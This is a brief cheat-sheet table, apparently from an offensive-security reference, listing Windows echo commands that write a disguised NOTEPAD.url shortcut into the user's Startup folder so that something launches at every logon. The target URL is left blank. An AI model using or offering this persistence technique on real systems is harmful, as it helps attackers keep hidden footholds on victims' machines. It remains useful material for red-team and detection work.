These commands are used to create persistence and other files in the OS.

| COMMAND | DESCRIPTION |
|--------------------------------------------|--------------------------------------------------------------------------------------|
| echo [InternetShortcut] > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url" | Create persistence using .URL file in directory, building the file in question |
| echo URL=" " >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url" | Create persistence using .URL file in directory, building the file in question |
| echo IconFile=C:\WINDOWS\system32\SHELL32.dll >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url" | Create persistence using .URL file in directory, building the file in question |
| echo IconIndex=20 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url" | Create persistence using .URL file in directory, building the file in question |
